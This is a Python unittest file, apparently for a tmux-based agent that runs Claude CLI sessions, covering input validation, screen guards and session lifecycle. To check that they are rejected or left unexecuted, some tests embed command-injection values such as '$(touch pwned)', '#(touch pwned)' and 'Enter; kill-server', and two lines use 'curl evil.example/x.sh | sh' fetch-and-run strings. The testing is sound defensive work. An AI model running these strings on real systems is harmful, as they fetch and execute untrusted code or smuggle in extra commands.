            self.assertEqual(a.ok("ping"), {})
            a.send_raw(b"not json\n{\"op\":\"ping\"}\n[1]\n")
            r = a.call("nope")
            self.assertEqual(r, {"id": a.ids, "ok": False, "error": "未知操作：nope"})
            self.assertIn("会话 id", a.err("paste", sid="bad", text="x"))
            errs = [e for e in a.events if e["ev"] == "error"]
            self.assertEqual(len(errs), 3)
            h = a.ok("hello")
            self.assertEqual(h["server_alive"], False)
            self.assertEqual(h["sessions"], [])
            self.assertEqual(h["tmux_path"], TMUX)
            self.assertTrue(h["tmux_version"].startswith("tmux "))
            self.assertEqual(h["home"], td)
            self.assertEqual(a.ok("list"), [])
            self.assertEqual(a.err("start", sid=SID, cwd=td, args=[]), "tmux 常驻进程未启动")
            self.assertEqual(a.ok("stop_keeper"), {"stopped": True, "remaining": 0})
            t0 = time.time()
            self.assertEqual(a.close(), 0)
            self.assertLess(time.time() - t0, 5)
            # 什么都没写（tmux 客户端自己会建空的套接字目录 tmux-<uid>，属于 tmux 的正常行为）
            self.assertEqual([x for x in os.listdir(td) if x != "tmux-%d" % os.getuid()], [])
            for root, dirs, files in os.walk(td):
                self.assertEqual(files, [])

    def test_idle_exit(self):
        with tempfile.TemporaryDirectory(dir="/tmp") as td:
            a = AgentProc(self.env(td, CCR_FAKE_IDLE_EXIT="1"))
            a.ok("ping")
            self.assertEqual(a.p.wait(10), 0)
            a.close()

    def test_default_idle_is_90s(self):
        self.assertEqual(node_agent.IDLE_EXIT, 90.0)


# ---------------------------------------------------------------- 端到端（本机 tmux + fake_tui）
@unittest.skipUnless(HAVE_TMUX, "需要本机 tmux")
class EndToEndTests(unittest.TestCase):
    def setUp(self):
        self.fe = FakeEnv()
        self.addCleanup(self.fe.cleanup, self)
        self.fe.start_keeper()
        self.a = AgentProc(self.fe.env)
        self.addCleanup(self.a.close)
        self.home = self.fe.env["HOME"]
        self.proj = os.path.join(self.home, "it's $(touch pwned) `x` 中文")
        os.makedirs(self.proj)

    def start(self, sid=SID, cwd=None, args=()):
        r = self.a.ok("start", sid=sid, cwd=cwd or self.proj, args=list(args))
        self.assertIsInstance(r["pane_pid"], int)
        self.fe.pids.add(r["pane_pid"])
        return r["pane_pid"]

    def test_hello_and_start_validation(self):
        h = self.a.ok("hello")
        self.assertTrue(h["server_alive"])
        self.assertEqual(h["sessions"], ["_ccr_keeper"])
        for kw, msg in ((dict(sid="bad"), "会话 id"), (dict(cwd="/nonexistent/x"), "不存在"),
                        (dict(cwd="rel"), "绝对路径"), (dict(args=["--settings", "x"]), "不允许"),
                        (dict(args=["--model", "$(touch /tmp/ccr_pwned_na)"]), "不合法"),
                        (dict(args=["-p"]), "不允许")):
            p = dict(sid=SID, cwd=self.proj, args=[])
            p.update(kw)
            self.assertIn(msg, self.a.err("start", **p))
        self.assertEqual(self.a.ok("list"), [])
        self.start()
        self.assertIn("已存在", self.a.err("start", sid=SID, cwd=self.proj, args=[]))
        self.assertEqual(sorted(self.a.ok("hello")["sessions"]), ["_ccr_keeper", "ccr-" + SID])
        for bad_keys in ([], ["Enter"] * 41, ["q"], ["C-d"], ["Enter; kill-server"], ["-t"], [1], "Enter"):
            self.assertRegex(self.a.err("keys", sid=SID, keys=bad_keys), "按键|keys")
        self.assertIn("NUL", self.a.err("paste", sid=SID, text="a\x00b"))
        self.assertIn("过长", self.a.err("paste", sid=SID, text="x" * 200001))
        self.assertIn("不存在", self.a.err("paste", sid=SID2, text="x"))
        self.assertIn("不存在", self.a.err("keys", sid=SID2, keys=["Enter"]))
        self.assertIn("不存在", self.a.err("capture", sid=SID2))
        self.assertEqual(self.a.ok("kill", sid=SID2), {})
        r = self.a.ok("stop_keeper")
        self.assertEqual(r, {"stopped": False, "remaining": 1})
        self.assertFalse(os.path.exists(os.path.join(self.home, "pwned")))
        self.assertFalse(os.path.exists("/tmp/ccr_pwned_na"))

    def test_full_session_flow(self):
        self.start(args=["--model", "sonnet", "--permission-mode", "acceptEdits", "--effort", "high"])
        self.a.ok("watch", sid=SID, on=True)
        self.a.screen_has(SID, "[Sonnet 5.5 · 1M · effort:high]")
        self.a.screen_has(SID, "⏵⏵ accept edits on (shift+tab to cycle)")
        sess = self.a.wait_event(lambda e: e["ev"] == "session")
        d = sess["data"]
        self.assertEqual(set(d), {"pid", "sessionId", "status", "cwd", "kind", "entrypoint"})
        self.assertEqual((d["status"], d["cwd"], d["kind"], d["entrypoint"]), ("idle", self.proj, "interactive", "cli"))
        sid_c = d["sessionId"]
        self.fe.pids.add(d["pid"])
        t = self.a.wait_event(lambda e: e["ev"] == "transcript")
        self.assertEqual((t["session_id"], t["reset"], t["entries"]), (sid_c, True, []))
        lst = self.a.ok("list")
        self.assertEqual(len(lst), 1)
        self.assertEqual(lst[0]["sid"], SID)
        self.assertEqual(lst[0]["name"], "ccr-" + SID)
        self.assertEqual(lst[0]["claude_pid"], d["pid"])
        self.assertFalse(lst[0]["pane_dead"])
        self.assertIsNone(lst[0]["exit_status"])
        self.assertEqual(lst[0]["session"]["sessionId"], sid_c)

        # 粘贴（含引号、$()、换行等）→ 不经 shell，原样进入输入框；enter 提交
        self.a.ok("paste", sid=SID, text=NASTY, enter=True)
        ev = self.a.wait_event(lambda e: e["ev"] == "transcript" and any(
            x["type"] == "user" and x["message"]["content"] == NASTY for x in e["entries"]))
        self.assertFalse(ev["reset"])
        self.a.wait_event(lambda e: e["ev"] == "session" and e["data"]["status"] == "busy")
        self.a.wait_event(lambda e: e["ev"] == "transcript" and any(x["type"] == "assistant" for x in e["entries"]))
        self.a.wait_event(lambda e: e["ev"] == "session" and e["data"]["status"] == "idle")
        self.assertFalse(os.path.exists("/tmp/ccr_pwned_na"))
        for e in self.a.events:  # transcript 只含 user/assistant/system
            if e["ev"] == "transcript":
                self.assertTrue(all(x["type"] in ("user", "assistant", "system") for x in e["entries"]))

        # 模式循环：acceptEdits → plan
        self.a.ok("keys", sid=SID, keys=["BTab"])
        self.a.screen_has(SID, "⏸ plan mode on")
        # 权限框：session.status=waiting；Esc 拒绝
        self.a.ok("paste", sid=SID, text="/tool", enter=True)
        self.a.screen_has(SID, "Do you want to proceed?")
        self.a.wait_event(lambda e: e["ev"] == "session" and e["data"]["status"] == "waiting")
        self.a.ok("keys", sid=SID, keys=["Escape"])
        self.a.screen_has(SID, "Did not run 1 call")
        self.assertFalse(os.path.exists("/tmp/ccr_fake_probe"))
        cap = self.a.ok("capture", sid=SID, history=200)["text"]
        self.assertIn("Did not run 1 call", cap)
        self.assertIn("❯ 引号 'single' \"double\" `id` $(touch /tmp/ccr_pwned_na)", cap)
        self.assertIn(len(self.a.ok("capture", sid=SID)["text"].rstrip("\n").split("\n")), (49, 50))  # 200x50
        self.assertIn("─" * 200, cap)

        # /exit → exited(0)；pane 保留（remain-on-exit），list 显示 pane_dead
        self.a.ok("paste", sid=SID, text="/exit", enter=True)
        ex = self.a.wait_event(lambda e: e["ev"] == "exited")
        self.assertIsInstance(ex.pop("pane_pid"), int)    # 代际信息：本地据此丢弃旧会话的迟到事件
        self.assertEqual(ex, {"ev": "exited", "sid": SID, "exit_status": 0})
        lst = self.a.ok("list")
        self.assertTrue(lst[0]["pane_dead"])
        self.assertEqual(lst[0]["exit_status"], 0)
        self.assertIsNone(lst[0]["claude_pid"])
        self.assertFalse(os.path.exists(os.path.join(self.home, ".claude", "sessions", "%d.json" % d["pid"])))
        # 已无存活会话 → stop_keeper 清掉死 pane 与 keeper，server 退出
        self.assertEqual(self.a.ok("stop_keeper"), {"stopped": True, "remaining": 0})
        deadline = time.time() + 5
        while self.fe.server_alive() and time.time() < deadline:
            time.sleep(0.1)
        self.assertFalse(self.fe.server_alive())
        self.assertFalse(self.a.ok("hello")["server_alive"])

    def test_busy_fast_polling_interrupt_kill(self):
        self.start(cwd="~")  # home 目录：信任框
        self.a.ok("watch", sid=SID, on=True)
        self.a.screen_has(SID, "Yes, I trust this folder")
        self.a.wait_event(lambda e: e["ev"] == "session" and e["data"]["status"] == "waiting")
        self.a.ok("keys", sid=SID, keys=["Down", "Enter"])
        self.a.screen_has(SID, "⏸ manual mode on")
        self.a.ok("paste", sid=SID, text="/long", enter=True)
        self.a.screen_has(SID, "esc to interrupt")
        n0 = len([e for e in self.a.events if e["ev"] == "screen"])
        time.sleep(1.5)
        n1 = len([e for e in self.a.events if e["ev"] == "screen"])
        self.assertGreaterEqual(n1 - n0, 4, "忙时应约 250ms 抓一次")
        self.a.ok("keys", sid=SID, keys=["Escape"])
        self.a.screen_has(SID, "Interrupted · What should Claude do instead?")
        # 空闲且无变化：不重复发相同画面
        time.sleep(3.5)
        n2 = len([e for e in self.a.events if e["ev"] == "screen"])
        time.sleep(2.0)
        self.assertEqual(len([e for e in self.a.events if e["ev"] == "screen"]), n2)
        # watch off：不再有事件
        self.a.ok("watch", sid=SID, on=False)
        self.a.ok("keys", sid=SID, keys=["BTab"])
        time.sleep(1.5)
        self.assertEqual(len([e for e in self.a.events if e["ev"] == "screen"]), n2)
        self.a.ok("watch", sid=SID, on=True)
        self.a.screen_has(SID, "accept edits on")  # 重新监视：立即发当前画面
        self.a.ok("kill", sid=SID)
        # kill 先停监视：自己 kill 掉的会话不再发 exited（避免迟到的 exited 误伤同 sid 重启的新会话）
        time.sleep(1.5)
        self.assertEqual([e for e in self.a.events if e["ev"] == "exited"], [])
        self.assertEqual(self.a.ok("list"), [])
        self.assertEqual(self.a.ok("kill", sid=SID), {})
        self.assertEqual(self.a.ok("stop_keeper"), {"stopped": True, "remaining": 0})

    def test_cwd_special_chars_and_restart_same_sid(self):
        """低 5：cwd 含 # / 结尾 ; 原样生效；中 2：同 sid kill 后重启，新 watch 立即发首帧、没有旧代际的 exited。"""
        for name in ("a#{session_name}b#(touch pwned)", "c;", "d\\;"):
            d = os.path.join(self.home, name)
            os.makedirs(d)
            pp = self.start(cwd=d)
            self.a.ok("watch", sid=SID, on=True)
            ev = self.a.wait_event(lambda e: e["ev"] == "session" and e["sid"] == SID and e["data"].get("cwd"))
            self.assertEqual(ev["data"]["cwd"], os.path.realpath(d), name)
            self.assertIsInstance(pp, int)
            self.a.ok("kill", sid=SID)
            self.assertEqual(self.a.ok("list"), [])
            with self.a.lock:
                del self.a.events[:]
        self.assertFalse(os.path.exists(os.path.join(self.home, "pwned")))
        # 重启同一 sid：start 丢掉旧 Watched；watch on 总是全新开始（不会因为旧屏幕缓存相同而不发首帧）
        self.start()
        self.a.ok("watch", sid=SID, on=True)
        self.a.wait_event(lambda e: e["ev"] == "screen" and e["sid"] == SID)
        self.a.ok("watch", sid=SID, on=True)
        with self.a.lock:
            n = len([e for e in self.a.events if e["ev"] == "screen"])
        self.a.wait_event(lambda e: e["ev"] == "screen" and e["sid"] == SID
                          and len([x for x in self.a.events if x["ev"] == "screen"]) > n)
        self.assertEqual([e for e in self.a.events if e["ev"] == "exited"], [])

    def test_keys_guard(self):
        """中 3/中 4/slash：带 guard 的 keys 在 agent 端发键前重抓屏复核，不通过就一个键都不按。"""
        self.start()
        self.a.ok("watch", sid=SID, on=True)
        self.a.screen_has(SID, "⏸ manual mode on")
        self.a.ok("paste", sid=SID, text="/model", enter=False)
        self.a.screen_has(SID, "❯ /model")
        err = self.a.call("keys", sid=SID, keys=["Enter"], guard={"input_box": True, "popup": "/effort"})
        self.assertFalse(err["ok"])
        self.assertEqual(err.get("code"), "guard")
        self.assertIn("补全列表高亮的是 /model", err["error"])
        self.assertIn("guard", self.a.err("keys", sid=SID, keys=["Enter"], guard={"bogus": 1}))
        self.a.ok("keys", sid=SID, keys=["Enter"], guard={"input_box": True, "input_nonempty": True,
                                                         "popup": "/model"})
        self.a.screen_has(SID, "Select model")
        # 面板打开后输入框不在了：input_box 守卫拒绝
        r = self.a.call("keys", sid=SID, keys=["Enter"], guard={"input_box": True})
        self.assertEqual((r["ok"], r.get("code")), (False, "guard"))
        self.a.ok("keys", sid=SID, keys=["Escape"])
        self.a.screen_has(SID, "Kept model as")


class GuardUnitTests(unittest.TestCase):
    """node_agent.check_guard 对真实画面（fixtures）的判断。"""

    @classmethod
    def setUpClass(cls):
        def load(name):
            out = {}
            with open(ROOT / "fixtures" / name, encoding="utf-8") as f:
                for line in f:
                    d = json.loads(line)
                    if "plain" in d:
                        out[d["name"]] = d["plain"]
            return out
        cls.D = load("tui_screens_dialogs.ndjson")

    def test_input_box_and_popup(self):
        g = node_agent.check_guard
        self.assertIsNone(g(self.D["ready"], {"input_box": True}))
        self.assertEqual(g(self.D["ready"], {"input_box": True, "input_nonempty": True}), "输入框是空的")
        self.assertIn("输入框不可见", g(self.D["perm"], {"input_box": True}))
        self.assertIn("输入框不可见", g(self.D["model"], {"input_box": True}))
        sp = self.D["slash_popup"]
        self.assertIsNone(g(sp, {"input_box": True, "input_nonempty": True, "popup": "/model"}))
        self.assertIn("/model", g(sp, {"input_box": True, "popup": "/effort"}))
        self.assertIn("/model", g(sp, {"input_box": True, "popup": None}))
        self.assertIsNone(g(self.D["ready"], {"input_box": True, "popup": None}))
        # 用户回显正上方有顶格横线：也不能把权限框当成输入框
        lines = self.D["perm"].split("\n")
        i = next(k for k, l in enumerate(lines) if l.startswith("❯ 用 Bash"))
        lines.insert(i, "─" * 80)
        self.assertIn("输入框不可见", g("\n".join(lines), {"input_box": True}))

    def test_lines_and_tail(self):
        from ccr import session as S
        g = node_agent.check_guard
        perm = self.D["perm"]
        tail = S._dialog_tail_guard(perm)
        self.assertIsNotNone(tail)
        node_agent.validate_guard(tail)
        self.assertIsNone(g(perm, tail))
        self.assertIsNone(g(perm + "\n\n", tail))      # 末尾空行不影响
        self.assertEqual(g(perm.replace("touch /tmp/ccr_tui_probe_denied2", "curl evil | sh"), tail), "对话框已变化")
        self.assertEqual(g(self.D["perm_write"], tail), "对话框已变化")
        hint = "  s to use this session only · Enter to save · Esc to cancel"
        self.assertIsNone(g(self.D["model"], {"lines": [hint]}))
        self.assertEqual(g(self.D["effort"], {"lines": [hint]}), "屏幕内容已变化")
        for bad in ({"tail": {"n": 0, "sha1": "0" * 40}}, {"tail": {"n": 3, "sha1": "xyz"}}, {"lines": "x"},
                    {"lines": ["a"] * 21}, {"popup": "model"}, {"input_box": 1}, []):
            with self.assertRaises(node_agent.OpError, msg=repr(bad)):
                node_agent.validate_guard(bad)

    def panel(self, name):
        return (ROOT / "fixtures" / "diff_panel" / (name + ".txt")).read_text(encoding="utf-8")

    def test_screen_lines_match_tui_parse(self):
        """agent 与本地（tui_parse / session）的屏幕规范化 + 裁 diff 面板逐字一致：旧 fixtures 全部画面、面板画面、
        以及若干合成画面（tail sha1 / guard.lines 才对得上）。"""
        from ccr import tui_parse
        texts = []
        for name in ("tui_screens_stream.ndjson", "tui_screens_dialogs.ndjson", "tui_screens_keys.ndjson"):
            with open(ROOT / "fixtures" / name, encoding="utf-8") as f:
                for line in f:
                    d = json.loads(line)
                    if "plain" in d:
                        texts.append(d["plain"])
                    texts += [x["s"] for x in d.get("frames") or ()]
        texts += [p.read_text(encoding="utf-8") for p in sorted((ROOT / "fixtures" / "diff_panel").glob("*.txt"))]
        texts += ["", "\n\n", "x" * 30 + "│✕\n" + ("a" * 60 + "│\n") * 5,
                  ("b" * 50 + "│\n") * 2 + "b" * 50 + "│3 files changed +1\n" + "c" * 50 + "│\n\n \n",
                  (" " * 45 + "│ /diff to close │\n") * 4]
        stripped = 0
        for t in texts:
            a, b = node_agent.screen_lines(t), tui_parse.screen_lines(t)
            self.assertEqual(a, b)
            stripped += a != [l.rstrip() for l in t.replace("\u00a0", " ").split("\n")][:len(a)]
        self.assertGreaterEqual(stripped, 12)
        # 两份实现的常量与正则一致
        for k in ("PANEL_MIN_COL", "PANEL_MAX_TOP", "PANEL_MIN_ROWS", "PANEL_SLOP", "PANEL_HEAD_ROWS"):
            self.assertEqual(getattr(node_agent, k), getattr(tui_parse, k), k)
        self.assertEqual(node_agent.PANEL_FILES_RE.pattern, tui_parse._PANEL_FILES_RE.pattern)
        self.assertEqual(node_agent.PANEL_HEAD_RE.pattern, tui_parse._PANEL_HEAD_RE.pattern)
        self.assertEqual(node_agent.PANEL_CLOSE_RE.pattern, tui_parse._PANEL_CLOSE_RE.pattern)

    def test_input_box_matches_tui_parse_cli_2_1_332(self):
        """CLI 2.1.332（macOS）：子代理列表圆点是 ⏺、焦点在列表上时选中行前有 "❯ "。agent 的 find_input_box 与
        tui_parse 对每一帧给出同样的结论（guard input_box 才不会误拒 / 误放），两份子代理行正则一致。"""
        from ccr import tui_parse
        texts = [p.read_text(encoding="utf-8") for p in sorted((ROOT / "fixtures" / "cli_2_1_332").glob("*.txt"))]
        frames = (ROOT / "fixtures" / "subagent_sample" / "screen_frames.txt").read_text(encoding="utf-8")
        texts += [x for x in re.split(r"^=== t=[0-9.]+\n", frames, flags=re.M) if x.strip()]
        boxes = 0
        for t in texts:
            lines = node_agent.screen_lines(t)
            self.assertEqual(lines, tui_parse.screen_lines(t))
            got = node_agent.find_input_box(lines) is not None
            self.assertEqual(got, tui_parse.parse_screen(t)["input"]["visible"], t[-400:])
            boxes += got
        self.assertGreater(boxes, 40)
        self.assertEqual(node_agent.G_AGENT_ROW_RE.pattern, tui_parse._FOOTER_AGENT_ROW_RE.pattern)
        # 焦点在列表上、两行状态栏（"⏺ main"、"❯ ◯ …" 是子代理行，不占状态栏/模式行的 4 行额度）：仍是输入框
        foc = (ROOT / "fixtures" / "cli_2_1_332" / "agents_focus_row.txt").read_text(encoding="utf-8")
        self.assertIsNone(node_agent.check_guard(foc, {"input_box": True}))
        extra = foc.replace("\n  enter to view", "\n  第二行状态栏 · 12:00\n  enter to view", 1)
        self.assertNotEqual(extra, foc)
        self.assertIsNone(node_agent.check_guard(extra, {"input_box": True}))
        self.assertTrue(tui_parse.parse_screen(extra)["input"]["visible"])

    def test_guards_with_diff_panel(self):
        """右侧 diff 面板打开时：对话框画在左栏（上横线是 "───│───"），tail / lines / input_box / hint 都按裁后的行复核。"""
        from ccr import session as S
        g = node_agent.check_guard
        perm = self.panel("permission_200")
        tail = S._dialog_tail_guard(perm)
        self.assertIsNotNone(tail)              # 以前：找不到对话框区域 → 所有对话框操作 409
        node_agent.validate_guard(tail)
        self.assertIsNone(g(perm, tail))
        self.assertIsNone(g(perm + "\n\n", tail))
        self.assertIn("输入框不可见", g(perm, {"input_box": True}))
        # 面板内容变化（文件数、diff）不算对话框变化；左栏对话框内容变化要拦下
        self.assertIsNone(g(perm.replace("4 files changed +13 -1", "5 files changed +14 -2"), tail))
        rows = perm.split("\n")
        k = next(i for i, l in enumerate(rows) if l.startswith(" python3 -c"))   # 对话框里的命令预览行
        rows[k] = rows[k].replace("python3 -c \"print(6*7)\" > answer.txt", "curl evil.example/x.sh | sh  ")
        self.assertEqual(g("\n".join(rows), tail), "对话框已变化")
        # 面板消失（例如窗口变窄）：对话框文字没变，裁后行一致，仍可按
        cut = "\n".join(l[:l.index("│")].rstrip() if "│" in l else l for l in perm.split("\n"))
        self.assertIsNone(g(cut, tail))
        # guard.lines：面板提示行按裁后的行定位
        line = S._raw_line(perm, "Esc to cancel · Tab to amend")
        self.assertEqual(line, " Esc to cancel · Tab to amend")
        self.assertIsNone(g(perm, {"lines": [line]}))

        done = self.panel("done_200")
        self.assertIsNone(g(done, {"input_box": True, "popup": None}))
        self.assertEqual(g(done, {"input_box": True, "input_nonempty": True}), "输入框是空的")
        self.assertIsNone(S._dialog_tail_guard(done))
        # 左栏里的 ctrl+b 提示（行尾是面板）：hint 守卫能找到
        rows = done.split("\n")
        k = next(i for i, l in enumerate(rows) if l.startswith("✻ Cogitated"))
        hint = "  (ctrl+b ctrl+b (twice) to run in background)"
        rows[k] = hint + " " * (110 - len(hint)) + rows[k][rows[k].index("│"):]
        with_hint = "\n".join(rows)
        self.assertIsNone(g(with_hint, {"input_box": True, "hint": "background"}))
        self.assertIn("没有对应的提示", g(done, {"input_box": True, "hint": "background"}))
        from ccr import tui_parse
        self.assertTrue(tui_parse.parse_screen(with_hint)["hints"]["background"])

    def test_tmux_literal(self):
        self.assertEqual(node_agent.tmux_literal("/a#{x}#(id)b"), "/a##{x}##(id)b")
        self.assertEqual(node_agent.tmux_literal("/c;"), "/c\\;")
        self.assertEqual(node_agent.tmux_literal("/x;y"), "/x;y")
        self.assertEqual(node_agent.tmux_literal("/plain"), "/plain")


class TransientTmuxTests(unittest.TestCase):
    """中 2：只有确定 "no server running" 才判会话退出；tmux 暂时失败（超时等）不能把活着的会话报成 exited。"""

    def run_tmux(self, results):
        calls = []

        def fake(args, input_bytes=None, timeout=15):
            calls.append(args[0])
            return results.pop(0) if len(results) > 1 else results[0]
        return mock.patch.object(node_agent, "tmux", fake), calls

    def test_list_and_stop_keeper(self):
        p, _ = self.run_tmux([(124, "", "tmux 命令超时")])
        with p:
            with self.assertRaises(node_agent.OpError) as cm:
                node_agent.op_list({})
            self.assertEqual(cm.exception.code, "tmux_busy")
            with self.assertRaises(node_agent.OpError):
                node_agent.op_stop_keeper({})
        p, _ = self.run_tmux([(1, "", "no server running on /tmp/tmux-1/ccr")])
        with p:
            self.assertEqual(node_agent.op_list({}), [])
            self.assertEqual(node_agent.op_stop_keeper({}), {"stopped": True, "remaining": 0})
        p, _ = self.run_tmux([(1, "", "error connecting to /tmp/tmux-1/ccr (No such file or directory)")])
        with p:
            self.assertEqual(node_agent.op_list({}), [])

    def test_watcher_tick(self):
        w = node_agent.Watcher()
        w.stop()
        out = []
        item = node_agent.Watched(SID)
        item.pane_pid = 4242
        w.items[SID] = item
        with mock.patch.object(node_agent, "emit", out.append), \
                mock.patch.object(node_agent, "list_panes_ex", return_value=(None, False)):
            w.tick([item])
            self.assertEqual(out, [])                    # 第一次暂时失败：不判退出
            self.assertIn(SID, w.items)
            w.tick([item])
        self.assertEqual(out, [{"ev": "exited", "sid": SID, "exit_status": None, "pane_pid": 4242}])
        # 确定 server 不在：立即判退出；被 kill/start 换掉的旧 Watched 不再发 exited
        out.clear()
        item = node_agent.Watched(SID)
        w.items[SID] = item
        old = node_agent.Watched(SID2)
        with mock.patch.object(node_agent, "emit", out.append), \
                mock.patch.object(node_agent, "list_panes_ex", return_value=(None, True)):
            w.tick([item, old])
        self.assertEqual([e["sid"] for e in out], [SID])
        # watch on 总是换成全新的 Watched
        w.set(SID, True)
        a = w.items[SID]
        a.screen = "cached"
        w.set(SID, True)
        self.assertIsNot(w.items[SID], a)
        self.assertIsNone(w.items[SID].screen)


if __name__ == "__main__":
    unittest.main()
